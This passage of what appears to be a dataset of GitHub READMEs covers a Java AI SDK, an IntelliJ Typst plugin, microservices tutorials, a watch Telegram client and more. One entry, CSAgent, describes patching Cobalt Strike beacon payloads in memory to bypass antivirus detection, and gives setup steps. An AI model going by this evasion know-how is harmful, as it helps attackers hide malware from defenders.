implementation group: 'io.github.lnyo-cly', name: 'ai4j-spring-boot-stater', version: '${project.version}'
```


### Maven
```xml
<!-- 非Spring应用 -->
<dependency>
    <groupId>io.github.lnyo-cly</groupId>
    <artifactId>ai4j</artifactId>
    <version>${project.version}</version>
</dependency>

```
```xml
<!-- Spring应用 -->
<dependency>
    <groupId>io.github.lnyo-cly</groupId>
    <artifactId>ai4j-spring-boot-stater</artifactId>
    <version>${project.version}</version>
</dependency>
```

## 获取AI服务实例

### 非Spring获取
```java
    public void test_init(){
        OpenAiConfig openAiConfig = new OpenAiConfig();

        Configuration configuration = new Configuration();
        configuration.setOpenAiConfig(openAiConfig);

        HttpLoggingInterceptor httpLoggingInterceptor = new HttpLoggingInterceptor();
        httpLoggingInterceptor.setLevel(HttpLoggingInterceptor.Level.HEADERS);

        OkHttpClient okHttpClient = new OkHttpClient
                .Builder()
                .addInterceptor(httpLoggingInterceptor)
                .addInterceptor(new ErrorInterceptor())
                .connectTimeout(300, TimeUnit.SECONDS)
                .writeTimeout(300, TimeUnit.SECONDS)
                .readTimeout(300, TimeUnit.SECONDS)
                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""127.0.0.1"",10809)))
                .build();
        configuration.setOkHttpClient(okHttpClient);

        AiService aiService = new AiService(configuration);

        embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);
        chatService = aiService.getChatService(PlatformType.getPlatform(""OPENAI""));

    }
```
### Spring获取
```yml
# 国内访问默认需要代理
ai:
  openai:
    api-key: ""api-key""
  okhttp:
    proxy-port: 10809
    proxy-url: ""127.0.0.1""
  zhipu:
    api-key: ""xxx""
  #other...
```

```java
// 注入Ai服务
@Autowired
private AiService aiService;

// 获取需要的服务实例
IChatService chatService = aiService.getChatService(PlatformType.OPENAI);
IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);
// ......
```

## Chat服务

### 同步请求调用
```java

public void test_chat() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""鲁迅为什么打周树人""))
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}

```

### 流式调用
```java
public void test_chat_stream() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构造请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""查询北京明天的天气""))
            .functions(""queryWeather"")
            .build();


    // 构造监听器
    SseListener sseListener = new SseListener() {
        @Override
        protected void send() {
            System.out.println(this.getCurrStr());
        }
    };
    // 显示函数参数，默认不显示
    sseListener.setShowToolArgs(true);

    // 发送SSE请求
    chatService.chatCompletionStream(chatCompletion, sseListener);

    System.out.println(sseListener.getOutput());

}
```

### 图片识别

```java
public void test_chat_image() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""图片中有什么东西"", ""https://cn.bing.com/images/search?view=detailV2&ccid=r0OnuYkv&id=9A07DE578F6ED50DB59DFEA5C675AC71845A6FC9&thid=OIP.r0OnuYkvsbqBrYk3kUT53AHaKX&mediaurl=https%3a%2f%2fimg.zcool.cn%2fcommunity%2f0104c15cd45b49a80121416816f1ec.jpg%401280w_1l_2o_100sh.jpg&exph=1792&expw=1280&q=%e5%b0%8f%e7%8c%ab%e5%9b%be%e7%89%87&simid=607987191780608963&FORM=IRPRST&ck=12127C1696CF374CB9D0F09AE99AFE69&selectedIndex=2&itb=0&qpvt=%e5%b0%8f%e7%8c%ab%e5%9b%be%e7%89%87""))
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}
```

### 函数调用

```java
public void test_chat_tool_call() throws Exception {
    // 获取chat服务实例
    IChatService chatService = aiService.getChatService(PlatformType.OPENAI);

    // 构建请求参数
    ChatCompletion chatCompletion = ChatCompletion.builder()
            .model(""gpt-4o-mini"")
            .message(ChatMessage.withUser(""今天北京天气怎么样""))
            .functions(""queryWeather"")
            .build();

    // 发送对话请求
    ChatCompletionResponse response = chatService.chatCompletion(chatCompletion);

    System.out.println(response);
}
```
#### 定义函数
```java
@FunctionCall(name = ""queryWeather"", description = ""查询目标地点的天气预报"")
public class QueryWeatherFunction implements Function<QueryWeatherFunction.Request, String> {

    @Data
    @FunctionRequest
    public static class Request{
        @FunctionParameter(description = ""需要查询天气的目标位置, 可以是城市中文名、城市拼音/英文名、省市名称组合、IP 地址、经纬度"")
        private String location;
        @FunctionParameter(description = ""需要查询未来天气的天数, 最多15日"")
        private int days = 15;
        @FunctionParameter(description = ""预报的天气类型，daily表示预报多天天气、hourly表示预测当天24天气、now为当前天气实况"")
        private Type type;
    }

    public enum Type{
        daily,
        hourly,
        now
    }

    @Override
    public String apply(Request request) {
        final String key = """";

        String url = String.format(""https://api.seniverse.com/v3/weather/%s.json?key=%s&location=%s&days=%d"",
                request.type.name(),
                key,
                request.location,
                request.days);


        OkHttpClient client = new OkHttpClient();

        okhttp3.Request http = new okhttp3.Request.Builder()
                .url(url)
                .get()
                .build();

        try (Response response = client.newCall(http).execute()) {
            if (response.isSuccessful()) {
                // 解析响应体
                return response.body() != null ? response.body().string() : """";
            } else {
                return ""获取天气失败 当前天气未知"";
            }
        } catch (Exception e) {
            // 处理异常
            e.printStackTrace();
            return ""获取天气失败 当前天气未知"";
        }
    }

}
```

## Embedding服务

```java
public void test_embed() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // 构建请求参数
    Embedding embeddingReq = Embedding.builder().input(""1+1"").build();

    // 发送embedding请求
    EmbeddingResponse embeddingResp = embeddingService.embedding(embeddingReq);

    System.out.println(embeddingResp);
}
```

## RAG
### 配置向量数据库
```yml
ai:
  vector:
    pinecone:
      url: """"
      key: """"
```
### 获取实例
```java
@Autowired
private PineconeService pineconeService;
```
### 插入向量数据库
```java
public void test_insert_vector_store() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // Tika读取file文件内容
    String fileContent = TikaUtil.parseFile(new File(""D:\\data\\test\\test.txt""));

    // 分割文本内容
    RecursiveCharacterTextSplitter recursiveCharacterTextSplitter = new RecursiveCharacterTextSplitter(1000, 200);
    List<String> contentList = recursiveCharacterTextSplitter.splitText(fileContent);

    // 转为向量
    Embedding build = Embedding.builder()
            .input(contentList)
            .model(""text-embedding-3-small"")
            .build();
    EmbeddingResponse embedding = embeddingService.embedding(build);
    List<List<Float>> vectors = embedding.getData().stream().map(EmbeddingObject::getEmbedding).collect(Collectors.toList());
    VertorDataEntity vertorDataEntity = new VertorDataEntity();
    vertorDataEntity.setVector(vectors);
    vertorDataEntity.setContent(contentList);
    
    // 向量存储
    Integer count = pineconeService.insert(vertorDataEntity, ""userId"");

}
```
### 从向量数据库查询
```java
public void test_query_vector_store() throws Exception {
    // 获取embedding服务实例
    IEmbeddingService embeddingService = aiService.getEmbeddingService(PlatformType.OPENAI);

    // 构建要查询的问题，转为向量
    Embedding build = Embedding.builder()
            .input(""question"")
            .model(""text-embedding-3-small"")
            .build();
    EmbeddingResponse embedding = embeddingService.embedding(build);
    List<Float> question = embedding.getData().get(0).getEmbedding();

    // 构建向量数据库的查询对象
    PineconeQuery pineconeQueryReq = PineconeQuery.builder()
            .namespace(""userId"")
            .vector(question)
            .build();

    String result = pineconeService.query(pineconeQueryReq, "" "");
    
    // 携带result，与chat服务进行对话
    // ......
}
```

### 删除向量数据库数据
```java
public void test_delete_vector_store() throws Exception {
    // 构建参数
    PineconeDelete pineconeDelete = PineconeDelete.builder()
                                    .deleteAll(true)
                                    .namespace(""userId"")
                                    .build();
    // 删除
    Boolean res = pineconeService.delete(pineconeDelete);
}
```



# 为AI4J提供贡献
欢迎您对AI4J提出建议、报告问题或贡献代码。您可以按照以下的方式为AI4J提供贡献: 

## 问题反馈
请使用GitHub Issue页面报告问题。尽可能具体地说明如何重现您的问题，包括操作系统、Java版本和任何相关日志跟踪等详细信息。

## PR
1. Fork 本仓库并创建您的分支。
2. 编写您的代码，并进行测试。
3. 确保您的代码符合现有的样式。
4. 提交时编写清晰的日志信息。对于小的改动，单行信息就可以了，但较大的改动应该有详细的描述。
5. 完成拉取请求表单，确保在`dev`分支进行改动，链接到您的 PR 解决的问题。

# 支持
如果您觉得这个项目对您有帮助，请点一个star⭐。


# 贡献者

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

<a href=""https://github.com/LnYo-Cly/ai4j/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=LnYo-Cly/ai4j"" />
</a>


# ⭐️ Star History
<a href=""https://star-history.com/#LnYo-Cly/ai4j&Date"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=LnYo-Cly/ai4j&type=Date"" />
 </picture>
</a>",11,1,2,6.0,"['gradle', 'maven', 'rag', 'pr', 'star', 'history']","['gradle', 'maven', 'rag', 'pr', 'star']"
LDAx2012/CSAgent,master,"# CSAgent
  Bypass antivirus software by patching the CS payload in memory through the agent.

  



### WHAT	

​	通过agent修改beacon.BeaconPayload#exportBeaconStage与pe.MalleablePE#process方法来在CS生成payload的过程中去除它的内存特征，使其生成即免杀，并绕过内存查杀。


### HOW
  CodeFile.java中存放了CS中beacon.dll与payload的特征字节与替换字节，CS则是项目源码
​	编译项目，在CS启动参数中添加 -javaagent:CS.jar ，将CodeFile0.java与CodeFile1.java放到同目录下，启动CS，正常生成payload


### ToDo
- 目前仅支持x64，也许会再总结下32位的特征
- 像yara规则一样支持通配符
- 直接写特征太不优雅，写成yara那样的配置文件，支持描述之类的
- 支持动态修改配置等功能
- https TCP DNS等更多测试
",1,0,1,0.0,"['csagent', 'what', 'how', 'todo']","['csagent', 'what', 'how', 'todo']"
LDemetrios/Kvasir,master,"# Kvasir

Kvasir (/kwɑ'zer/) is an (unofficial) Intellij IDEa plugin adding support for [Typst](https://typst.app/docs) language.

![screenshot.png](screenshot.png)
![preview.png](preview.png)

## Features

- Customizable syntax highlight
- Instant preview (Uses `typst watch` for now)
- Compilation errors display
- Theme-aware preview (background and foreground colors are accessible via `sys.inputs.kvasir-preview-background` and `-foreground` respectively, as a rgb hex string)

The plugin is in the beta stage, a lot of features are yet to come. 
See _Roadmap_ for the information about planned features, 
and _Nearest plans_ for those which are currently in development. 
Feel free to open issues and pull requests.

## Installation

The plugin can be manually installed from disk with [archive](distributions/Kvasir-0.2.0-signed.zip), 
or from JetBrains Marketplace by name.

## Roadmap
(Before opening a feature request make sure it's not already planned)

Listed by group, not by priority (see _Nearest plans_ for those)

- Highlighting
  - [X] Basic Typst formatting
  - [X] Rainbow brackets
  - [ ] Math support
  - [ ] Error recovery (one error shouldn't bust highlighting for the rest of the file)
  - [ ] Language injections: highlight raw code due to its actual language
- Preview and Compiler errors
  - [X] Basic (typst watch)
  - [ ] Integrate tinymist
- Formatter
  - [ ] Sketch formatter (integrate typstfmt or typstyle)
  - [ ] Intellij-based, configurable formatter
- Indexing
  - [ ] Go to definition, renaming, find usages
  - [ ] Hover tips
  - [ ] Inlay hints
  - [ ] Documentation pop-ups
- Scope recognition
  - [ ] Folding ranges
  - [ ] Highlighting current scope
  - [ ] Colored guides
- Code Actions
  - [ ] Commenter
  - [ ] ""Surround with"" (shortcuts for making text italic, bold, etc)
  - [ ] Introduce variable
  - [ ] Pattern recognition (how am I gonna do that? omg)
- Project-level support
  - [ ] Gradle plugin
  - [ ] IDEa project template
  - [ ] Typst project template

## Nearest plans

- Sketch formatter
- More settings
- Error recovery
- Go to definition, renaming, find usages

## Known bugs

- Shorthands inside headings aren't highlighted properly.
- If `page.fill` is not `set` explicitly, the picture may appear transparent. `#set page(fill:white)` (or another color) helps.
- Errors in the `File Errors` are shown in the order of how they are located in the document, not in order of the stacktrace. I'm not sure if it's even possible, but I'm working on it.

## Contacts

Telegram: @LDemetrios
Mail: ldemetrios@yandex.ru
",0,0,1,0.0,"['kvasir', 'feature', 'installation', 'roadmap', 'near', 'plan', 'know', 'bug', 'contact']","['kvasir', 'feature', 'installation', 'roadmap', 'near']"
Benojir/Fogplix-Anime,main,"﻿# Fogplix Anime
 ### Visit <a href=""https://fogplix-anime.com"">https://fogplix-anime.com</a> for more info.

 ### Join Telegram:  <a href=""https://telegram.me/Fogplix"">Go to Telegram</a>
",4,0,1,0.0,"['fogplix', 'anime', 'visit', 'a', 'http', 'http', 'info', 'join', 'telegram', 'a', 'http', 'go', 'telegram']","['http', 'a', 'telegram', 'fogplix', 'anime']"
KirDemorgan/desaAPI,master,"# DesaAPI

DesaAPI is a RESTful API for managing projects, task columns, and tasks. It is built using Java, Spring Boot, and JPA with a Maven build system.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
    - [Projects](#projects)
    - [Task Columns](#task-columns)
    - [Tasks](#tasks)
- [Contributing](#contributing)
- [License](#license)

## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/KirDemorgan/desaAPI.git
    cd desaAPI
    ```

2. Build the project using Maven:
    ```sh
    mvn clean install
    ```

3. Run the application:
    ```sh
    mvn spring-boot:run
    ```

## Usage

The API can be accessed at `http://localhost:8080/api`.

## API Endpoints

### Projects

- **Get all projects**
    ```http
    GET /api/projects
    ```
  **Query Parameters:**
    - `prefix_name` (optional): Filter projects by name prefix.

  **Response:**
    ```json
    [
        {
            ""id"": 1,
            ""name"": ""Project 1"",
            ""taskColumnIds"": [1, 2]
        },
        ...
    ]
    ```

- **Create or update a project**
    ```http
    POST /api/projects
    ```
  **Request Parameters:**
    - `project_id` (optional): ID of the project to update.
    - `project_name` (optional): Name of the project.

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Project 1"",
        ""taskColumnIds"": [1, 2]
    }
    ```

- **Delete a project**
    ```http
    DELETE /api/projects/{projectId}
    ```
  **Path Parameters:**
    - `projectId`: ID of the project to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Project with id 1 deleted successfully""
    }
    ```

### Task Columns

- **Change task column position**
    ```http
    PATCH /api/task_columns/{task_column_id}/position
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column to update.

  **Request Parameters:**
    - `task_column_new_position`: New position of the task column.

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Column 1"",
        ""position"": 2,
        ""tasks"": [...]
    }
    ```

- **Delete a task column**
    ```http
    DELETE /api/task_columns/{task_column_id}
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Task column with id 1 deleted successfully""
    }
    ```

### Tasks

- **Get all tasks in a column**
    ```http
    GET /api/projects/{task_column_id}/tasks
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column.

  **Response:**
    ```json
    [
        {
            ""id"": 1,
            ""name"": ""Task 1"",
            ""description"": ""Description 1"",
            ""taskColumnId"": 1
        },
        ...
    ]
    ```

- **Create a task**
    ```http
    POST /api/projects/{task_column_id}/task
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column.

  **Request Body:**
    ```json
    {
        ""taskName"": ""Task 1"",
        ""optionalTaskDescription"": ""Description 1""
    }
    ```

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Task 1"",
        ""description"": ""Description 1"",
        ""taskColumnId"": 1
    }
    ```

- **Update a task**
    ```http
    PATCH /api/projects/{task_id}/task
    ```
  **Path Parameters:**
    - `task_id`: ID of the task to update.

  **Request Body:**
    ```json
    {
        ""taskName"": ""Updated Task 1"",
        ""optionalTaskDescription"": ""Updated Description 1""
    }
    ```

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Updated Task 1"",
        ""description"": ""Updated Description 1"",
        ""taskColumnId"": 1
    }
    ```

- **Delete a task**
    ```http
    DELETE /api/projects/{task_id}/task
    ```
  **Path Parameters:**
    - `task_id`: ID of the task to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Task with id 1 deleted successfully""
    }
    ```

## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any changes.

## License

This project is licensed under the MIT License.",0,0,2,0.0,"['desaapi', 'table', 'content', 'installation', 'usage', 'api', 'endpoint', 'project', 'task', 'column', 'task', 'contribute', 'license']","['task', 'desaapi', 'table', 'content', 'installation']"
SaiUpadhyayula/spring-boot-3-microservices-course,master,"# Spring Boot Microservices
This repository contains the latest source code of the spring-boot-microservices tutorial

You can watch the tutorial on Youtube [here](https://youtu.be/yn_stY3HCr8?si=EjrBEUl0P-bzSWRG)

## Services Overview

- Product Service
- Order Service
- Inventory Service
- Notification Service
- API Gateway using Spring Cloud Gateway MVC
- Shop Frontend using Angular 18

## Tech Stack

The technologies used in this project are:

- Spring Boot
- Angular
- Mongo DB
- MySQL
- Kafka
- Keycloak
- Test Containers with Wiremock
- Grafana Stack (Prometheus, Grafana, Loki and Tempo)
- API Gateway using Spring Cloud Gateway MVC
- Kubernetes


## Application Architecture
![image](https://github.com/user-attachments/assets/d4ef38bd-8ae5-4cc7-9ac5-7a8e5ec3c969)

## How to run the frontend application

Make sure you have the following installed on your machine:

- Node.js
- NPM
- Angular CLI

Run the following commands to start the frontend application

```shell
cd frontend
npm install
npm run start
```
## How to build the backend services

Run the following command to build and package the backend services into a docker container

```shell
mvn spring-boot:build-image -DdockerPassword=<your-docker-account-password>
```

The above command will build and package the services into a docker container and push it to your docker hub account.

## How to run the backend services

Make sure you have the following installed on your machine:

- Java 21
- Docker
- Kind Cluster - https://kind.sigs.k8s.io/docs/user/quick-start/#installation

### Start Kind Cluster
    
Run the k8s/kind/create-kind-cluster.sh script to create the kind Kubernetes cluster

```shell
./k8s/kind/create-kind-cluster.sh
```
This will create a kind cluster and pre-load all the required docker images into the cluster, this will save you time downloading the images when you deploy the application.

### Deploy the infrastructure

Run the k8s/manisfests/infrastructure.yaml file to deploy the infrastructure

```shell
kubectl apply -f k8s/manifests/infrastructure.yaml
```

### Deploy the services

Run the k8s/manifests/applications.yaml file to deploy the services

```shell
kubectl apply -f k8s/manifests/applications.yaml
```

### Access the API Gateway

To access the API Gateway, you need to port-forward the gateway service to your local machine

```shell
kubectl port-forward svc/gateway-service 9000:9000
```

### Access the Keycloak Admin Console
To access the Keycloak admin console, you need to port-forward the keycloak service to your local machine

```shell
kubectl port-forward svc/keycloak 8080:8080
```

### Access the Grafana Dashboards
To access the Grafana dashboards, you need to port-forward the grafana service to your local machine

```shell
kubectl port-forward svc/grafana 3000:3000
```
",0,2,2,1.0,"['spring', 'boot', 'microservices', 'service', 'overview', 'tech', 'stack', 'application', 'architecture', 'how', 'run', 'frontend', 'application', 'how', 'build', 'backend', 'service', 'how', 'run', 'backend', 'service', 'start', 'kind', 'cluster', 'deploy', 'infrastructure', 'deploy', 'service', 'access', 'api', 'gateway', 'access', 'keycloak', 'admin', 'console', 'access', 'grafana', 'dashboard']","['service', 'how', 'access', 'application', 'run']"
gohj99/Telewatch,master,"<a href=""https://github.com/gohj99/Telewatch"">
<img src=""https://socialify.git.ci/gohj99/Telewatch/image?description=1&descriptionEditable=A%20Telegram%20clients%20for%20Android%20watche&font=KoHo&forks=1&issues=1&logo=https://github.com/gohj99/Telewatch/blob/master/telewatch.png?raw=true?raw=true&name=1&owner=1&pattern=Circuit%20Board&pulls=1&stargazers=1&theme=Auto"" alt=""Telewatch"" />
</a>

<div align=""center"">
  <br/>
  <div>
      English | <a href=""./README.zh-CN.md"">简体中文</a> | <a href=""./README.zh-TW.md"">繁體中文</a> | <a href=""./README.ja-JP.md"">日本語</a>
  </div>
  <br/>

<div>
    <a href=""https://github.com/gohj99/Telewatch/blob/master/LICENSE"">
      <img
        src=""https://img.shields.io/github/license/gohj99/Telewatch?style=flat-square""
      />
    </a >
    <a href=""https://github.com/gohj99/Telewatch/releases"">
      <img
        src=""https://img.shields.io/github/downloads/gohj99/Telewatch/total?style=flat-square""
      />  
    </a >
  </div>
</div>

![Screenshot](Screenshot.png)

## Download

Download: [Telewatch](https://github.com/gohj99/Telewatch/releases)  
ADB Shell:

1. Download Telewatch for releases
2. Install:

```shell
adb install Telewatch.apk
```

## Functions

- Multi-account support
- Interface font adjustment
- Unread/read indicator
- Connection status indicator
- Viewing or downloading text, images, and videos
- Saving images or videos
- Text messaging
- Message editing
- Message deletion
- Support for rotating the digital crown

## Minimum and recommended requirements

- Minimum RAM: 1G
- Minimum ROM: 8G
- Minimum System: Android 7.0 (API Level 24 Nougat)
- Recommended RAM: 2G
- Recommended ROM: 16G
- Recommended System: Android 11 (API Level 30 R) or Wear OS 3.0 (API level 30)

## Community

We recommend using [issue](https://github.com/gohj99/Telewatch/issues) to provide the most direct
and effective feedback. Of course, the following options for feedback are also available:

- [Telegram](https://t.me/teleAndroidwatch)

## Star History

<a href=""https://star-history.com/#gohj99/Telewatch&Date"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=gohj99/Telewatch&type=Date&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=gohj99/Telewatch&type=Date"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=gohj99/Telewatch&type=Date"" />
 </picture>
</a>
",9,0,2,3.0,"['download', 'function', 'minimum', 'recommend', 'requirement', 'community', 'star', 'history']","['download', 'function', 'minimum', 'recommend', 'requirement']"
Potion-Studios/Oh-The-Biomes-Weve-Gone,1.20.1,"# Oh The Biomes We've Gone
### By Potion Studios

![img.png](readme/BiomesWeveGoneBigLogo.png)

## The Sequel to Oh The Biomes You'll Go

### Official Downloads
* Curseforge: https://www.curseforge.com/minecraft/mc-mods/oh-the-biomes-weve-gone
* Modrinth: https://modrinth.com/project/oh-the-biomes-weve-gone/

### Maven Information
- Releases: https://maven.jt-dev.tech/releases
- Snapshots: https://maven.jt-dev.tech/snapshots
  - Common: net.potionstudios:Oh-The-Biomes-Weve-Gone-Common:{version}
  - Fabric: net.potionstudios:Oh-The-Biomes-Weve-Gone-Fabric:{version}
  - Forge: net.potionstudios:Oh-The-Biomes-Weve-Gone-Forge:{version}

### Dependencies
- TerraBlender 
  - Github: https://github.com/Glitchfiend/TerraBlender/
  - CurseForge (Forge): https://www.curseforge.com/minecraft/mc-mods/terrablender
  - CurseForge (Fabric): https://www.curseforge.com/minecraft/mc-mods/terrablender-fabric
  - Modrinth: https://modrinth.com/mod/terrablender

- GeckoLib
  - Github: https://github.com/bernie-g/geckolib
  - CurseForge: https://www.curseforge.com/minecraft/mc-mods/geckolib
  - Modrinth: https://modrinth.com/mod/geckolib

- CorgiLib
  - Github: https://github.com/CorgiTaco/CorgiLib
  - CurseForge: https://www.curseforge.com/minecraft/mc-mods/corgilib
  - Modrinth: https://modrinth.com/mod/corgilib

- Oh The Tree's You'll Grow
  - Github: https://github.com/CorgiTaco/Oh-The-Trees-Youll-Grow
  - CurseForge: https://www.curseforge.com/minecraft/mc-mods/oh-the-trees-youll-grow
  - Modrinth: https://modrinth.com/mod/oh-the-trees-youll-grow

- Fabric API (Fabric Version Only)
  - Github: https://github.com/FabricMC/fabric
  - CurseForge: https://www.curseforge.com/minecraft/mc-mods/fabric-api
  - Modrinth: https://modrinth.com/mod/fabric-api
",17,9,5,9.0,"['oh', 'the', 'biome', 'we', 'go', 'by', 'potion', 'studio', 'the', 'sequel', 'oh', 'the', 'biome', 'you', 'go', 'official', 'downloads', 'maven', 'information', 'dependency']","['the', 'oh', 'biome', 'go', 'we']"
graalvm/graal-languages-demos,main,"# Graal Languages - Demos and Guides

This repository contains demo applications and guides for [GraalJS](./graaljs), [GraalPy](./graalpy/), [GraalWasm](./graalwasm), and other Graal Languages.
Each demo and guide includes a _README.md_ that explains how to run the application and how it works in more detail.

## Help

If you need help with any of the demos or guides, please [file a GitHub issue](https://github.com/graalvm/graal-languages-demos/issues/new).

## Contributing

This project welcomes contributions from the community. Before submitting a pull request, please [review our contribution guide](./CONTRIBUTING.md).

## Security

Please consult the [security guide](./SECURITY.md) for our responsible security vulnerability disclosure process.

## License

Copyright (c) 2024 Oracle and/or its affiliates.

Released under the Universal Permissive License v1.0 as shown at
<https://oss.oracle.com/licenses/upl/>.
",0,0,1,5.0,"['graal', 'language', 'demo', 'guide', 'help', 'contribute', 'security', 'license']","['graal', 'language', 'demo', 'guide', 'help']"
7amo10/Complete-Data-Structures-and-Algorithms-tutorial,main,"# Complete Data Structures and Algorithms tutorial💫🦅


I am Ahmed Ashour and this repo is for learning deeply about data structures and algorithms for beginners in Java.

![Screenshot](https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExeGZ6ZGp2dmw1Nm1mMDN3djN4bDF6cnBseTRzeDZldWNkZ20xbjM2YiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o6Yg4GUVgIUg3bf7W/giphy.gif)
## Table of Contents

- [1.Big O Notation](#BigONotation)
- [2.Arrays](#Arrays)
- [3.ArrayList](#ArrayList)
- [4.Linked List](#LinkedList)
  - [SinglyLinked List](#SinglyLinkedList)
  - [Circular Singly Linked List](#CircularSinglyLinkedList)
  - [Doubly Linked List](#DoublyLinkedList)
  - [Circular Doubly Linked List](#CircularDoublyLinkedList)
- [5.Stack](#Stack)
- [6.Queue](#Queue)  
- [7.Recursion](#Recursion)
- [8.Tree / Binary Tree](#Tree/BinaryTree)
- [9.Binary Search Tree](#BinarySearchTree)
- [10.AVL Tree](#Tree_AVL)
- [11.Binary Heap](#BinaryHeap)
- [12.Trie](#Trie)
- [13.Hashing](#Hashing)
- [14.Sort Algorithms](#SortAlgorithms)
- [15.Searching Algorithms](#SearchingAlgorithms)
- [16.Graph Algorithms](#GraphAlgorithms)
- [17.Graph Traversal](#GraphTraversal)
- [18.Topological Sort](#TopologicalSort)
- [19.Single Source Shortest Path Problem](#SingleSourceShortestPathProblem)
- [20.Dijkstra's Algorithm](#Dijkstra'sAlgorithm)
- [21.Bellman Ford Algorithm](#BellmanFordAlgorithm)
- [22.All Pairs Shortest Path Problem](#AllPairsShortestPathProblem)
- [23.Floyd Warshall](#FloydWarshall)
- [24.Minimum Spanning Tree](#MinimumSpanningTree)
- [25.Kruskal's and Prim's Algorithms](#Kruskal'sandPrim'sAlgorithms)
- [26.Cracking Graph and Tree Interview Questions ](#CrackingGraphandTreeInterviewQuestions )
- [27.Greedy Algorithms](#GreedyAlgorithms)
- [28.Divide and Conquer Algorithms](#DivideandConquerAlgorithms)
- [29.Dynamic Programming](#DynamicProgramming)


## About The Project✨✊



This course is designed to help you to achieve your career goals. Whether you are looking to get more into Data Structures and Algorithms, increase your learning potential, or just want a job with more freedom, this is the right course for you!

## Getting Started

In this Repo Course, you can begin with the education links below and browse various courses before going into the practical implementation that I attached. 

### Prerequisites

First, you need to know about basic programming language principles like loops, functions,...etc. Second, studying OOP very well.
- Note that any programming language doesn't matter if you know the basic prerequisites above with C++ for example go to the coding tutorial.


## After finishing this tutorial, you will be able to:

- [x] Learn basic algorithmic techniques such as greedy algorithms, binary search, sorting, and dynamic programming.
- [x] Learn the strengths and weaknesses of a variety of data structures, so you can choose the best data structure for your data and applications
- [x] Learn many of the algorithms commonly used to sort data, so your applications will perform efficiently when sorting large datasets
- [x] Learn how to apply graph and string algorithms to solve real-world challenges: finding shortest paths on huge maps and assembling genomes from millions of pieces. 


We continue our commitment to improving and expanding the capabilities of makeread. me to provide an efficient and seamless readme generation experience to our users.

## Contributing

Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag &quot;enhancement&quot;
Don&#39;t forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m &#39;Add some AmazingFeature&#39;`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request


## Contact

If you have any questions or suggestions, feel free to reach out to us:

- Raise an issue on the repository: [GitHub Repository](https://github.com/7amo10)

- Connect with us on LinkedIn: [@Eng.AhmedAshour](https://www.linkedin.com/in/eng-ahmed-ashour-45b65b263/)


## Notice

The content is updated regularly and is now being worked on daily, so do not worry if the rest of the course content will be delayed  🚀
",0,0,1,0.0,"['complete', 'data', 'structure', 'algorithm', 'table', 'content', 'about', 'the', 'get', 'start', 'prerequisite', 'after', 'finish', 'tutorial', 'able', 'to', 'contribute', 'contact', 'notice']","['complete', 'data', 'structure', 'algorithm', 'table']"
marieemoiselle/CS211-OOP-samples,main,"# OBJECT-ORIENTED PROGRAMMING
![CS-211](https://github.com/user-attachments/assets/ebf8983e-81e1-4280-862e-34c90986a0cb)
<br/>
by: **Fatima Marie P. Agdon, MSCS**<br>
Note: This is an ongoing repository. Updates will be posted as the course progresses.
<br>Don't forget to give this a ⭐!

## 👋🏻 Greetings!
